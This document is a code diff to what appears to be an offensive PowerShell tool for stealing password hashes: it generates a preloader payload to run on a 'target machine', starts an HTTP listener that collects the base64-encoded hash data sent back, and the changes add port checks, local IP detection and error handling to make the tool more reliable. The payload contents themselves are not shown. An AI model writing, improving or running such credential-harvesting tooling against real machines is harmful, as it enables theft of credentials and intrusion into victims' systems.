@@ -32,6 +32,31 @@ function New-Payloads {
 	return [PSCustomObject]@{Preloader=$Preloader;Loader=$Loader;Payload=$Payload}
 }
 
+function Test-Port {
+    [CmdletBinding()]
+    param (
+		[Parameter(Mandatory = $true)]
+        [String]
+        $IP,
+        [Parameter(Mandatory = $true)]
+        [Int64]
+        $Port
+    )
+
+        $RequestCallback = $State = $null
+        $Client = New-Object System.Net.Sockets.TcpClient
+        $BeginConnect = $Client.BeginConnect($IP,$Port,$RequestCallback,$State)
+        Start-Sleep -Milliseconds 100
+        $Connected = $Client.Connected
+        $Client.Close()
+        return $Connected
+}
+
+function Get-LocalIP {
+    $IP = Get-NetIPAddress | Where-Object -Property "PrefixOrigin" -Value "Dhcp" -EQ | Select-Object -ExpandProperty "IPAddress" -First 1
+    return $IP
+}
+
 function Start-TelemetryServer {
 	[CmdletBinding()]
 	Param(
@@ -47,12 +72,19 @@ function Start-TelemetryServer {
 	if (-not (New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
     {
         Write-Error -Message "Please start as Administrator" -Exception PermissionError
-        Exit;
+        return;
     }
 
 	$Listener = New-Object Net.HttpListener
 	$Listener.Prefixes.Add("http://+:$ServerPort/")
-	$Listener.Start()
+
+	try {
+		$Listener.Start()
+	}
+	catch {
+		Write-Error -Message "The webserver could not be started"
+		return;
+	}
 
 	$RecievedData = $null
 	while (!$RecievedData) {
@@ -83,7 +115,7 @@ function Start-TelemetryServer {
 function Start-HashAcquisition {
 	[CmdletBinding()]
 	Param(
-		[Parameter(Mandatory = $true, Position = 0)]
+		[Parameter(Mandatory = $false, Position = 0)]
 		[ValidateNotNullOrEmpty()]
 		[string]
 		$ServerAddress,
@@ -97,27 +129,41 @@ function Start-HashAcquisition {
 		$ServerPort = 9000
 	)
 
-	Clear-Host
-
 	if (-not (New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
     {
         Write-Error -Message "Please start as Administrator" -Exception PermissionError
         return;
     }
 
+	if (!$ServerAddress) {$ServerAddress = Get-LocalIP}
+
+	if (Test-Port -IP $ServerAddress -Port $ServerPort)
+	{
+		Write-Error -Message "The specified port ($ServerPort) is already in use"
+		return;
+	}
+
 	$Payloads = New-Payloads -ServerAddress $ServerAddress -ServerPort $ServerPort
 
+	Clear-Host
 	Write-Host
 	Write-Host "Execute the following on a target machine:"
 	Write-Host $Payloads.Preloader
 	Write-Host
 
 	Write-Host
-	Write-Host "Starting telemetry server on port $ServerPort..."
+	Write-Host "Listening for incoming requests on 127.0.0.1:$ServerPort..."
 	Write-Host
 	Write-Host
 
 	$Data = Start-TelemetryServer -Payloads $Payloads -ServerPort $ServerPort
+
+	if (!$Data)
+	{
+		Write-Error -Message "Data reception failed"
+		return;
+	}
+
 	$HashInfo = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($Data.Data))
 	$TargetAddress = $Data.Origin
 
